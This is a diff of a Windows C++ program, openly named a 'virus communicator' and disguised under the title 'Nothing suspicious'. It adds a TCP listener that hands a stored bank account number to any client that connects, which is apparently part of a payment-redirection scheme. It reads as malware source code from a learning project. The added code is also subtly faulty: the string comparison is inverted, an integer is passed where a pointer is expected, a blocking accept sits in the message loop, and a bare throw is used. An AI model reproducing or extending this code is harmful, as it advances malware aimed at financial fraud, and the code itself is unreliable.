@@ -1,17 +1,30 @@
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+
 #include <Windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#include <stdlib.h>
+
 #include "resource2.h"
-#include <WinSock2.h>
+
+#pragma comment(lib, "Ws2_32.lib")
 
 #define REQUEST_NUMBER	0xDEAD
 #define POST_NUMBER		0xBEEF
 #define MAXL			26
 #define MY_BN_CLICKED	1001
+#define DEFAULT_PORT	"27015"
+#define DEAFULT_BUFLEN	512
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 bool init(HINSTANCE hInstance);
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 void MoveToCb();
-void PostNumber();
+void HandleClient();
+bool init_winsock();
 INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
 
 constexpr CHAR szClassName[] = "KomunikatorWirusa";
@@ -20,11 +33,16 @@ constexpr CHAR msgName[] = "Nic podejrzanego";
 LPSTR bankAccount;
 HWND hwndThis;
 bool bAset;
+char sockbuf[DEAFULT_BUFLEN];
+
+SOCKET ListenSocket, ClientSocket;
+struct addrinfo *result = NULL, *ptr = NULL, hints, saClient;
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	if (!init(hInstance)) return 1;
-
+	if (!init_winsock()) return 2;
+	int iSizeofSaClient = sizeof(saClient);
 	MSG msg;
 
 	while (GetMessage(&msg, NULL, 0, 0) > 0)
@@ -38,7 +56,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 			);
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
+
+		ClientSocket = WSAAccept(ListenSocket, (SOCKADDR*)&saClient,
+			(LPINT)iSizeofSaClient, NULL, NULL);
+		
+		if (ClientSocket != INVALID_SOCKET && bAset)
+		{
+			HandleClient();
+		}
 	}
+
+	closesocket(ListenSocket);
+	closesocket(ClientSocket);
+	WSACleanup();
 	return 0;
 }
 
@@ -98,6 +128,56 @@ bool init(HINSTANCE hInstance)
 	return true;
 }
 
+bool init_winsock()
+{
+	WSADATA wsadata;
+	int iResult;
+	WORD wersja;
+	wersja = MAKEWORD(2, 2);
+	iResult = WSAStartup(wersja, &wsadata);
+	if (iResult != NO_ERROR)
+		return false;
+
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+	hints.ai_flags = AI_PASSIVE;
+
+	// Resolve the local address and port to be used by the server
+	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
+	if (iResult != NO_ERROR)
+		return false;
+
+	// Create a SOCKET for the server to listen for client connections
+	ListenSocket = INVALID_SOCKET;
+	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	if (ListenSocket == INVALID_SOCKET)
+	{
+		freeaddrinfo(result);
+		WSACleanup();
+		return false;
+	}
+
+	// Setup the TCP listening socket
+	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
+	if (iResult == SOCKET_ERROR) {
+		freeaddrinfo(result);
+		closesocket(ListenSocket);
+		WSACleanup();
+		return false;
+	}
+	freeaddrinfo(result); // No longer needed
+
+	if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
+		closesocket(ListenSocket);
+		WSACleanup();
+		return false;
+	}
+
+	return true;
+}
+
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
 	switch (msg)
@@ -124,9 +204,32 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
-void PostNumber()
+void HandleClient()
 {
+	int sockbuflen = DEAFULT_BUFLEN;
+	int iResult = recv(ClientSocket, sockbuf, sockbuflen, 0);
+	if (iResult == SOCKET_ERROR && WSAGetLastError() == WSAEMSGSIZE) throw;
+	if (iResult > 0)
+	{
+		if (strcmp(sockbuf, "Dawaj numer konta!")) {
+			//ZeroMemory(recvbuf, recvbuflen * sizeof(char)); // potrzebne? chyba nie, bo strcpy wpisze na koniec zero
+			//strcpy(sockbuf, bankAccount);
+			strcpy_s(sockbuf, bankAccount);
+			int iSendResult = send(ClientSocket, sockbuf, iResult, 0);
+			if (iSendResult == SOCKET_ERROR)
+			{
+				closesocket(ClientSocket);
+				return; // error
+			}
+		}
+	}
+	else
+	{
+		closesocket(ClientSocket);
+		return; // error
+	}
 
+	closesocket(ClientSocket);
 }
 
 INT_PTR CALLBACK DialogProc(HWND hDlg, UINT msg, WPARAM wParam, LPARAM lParam)
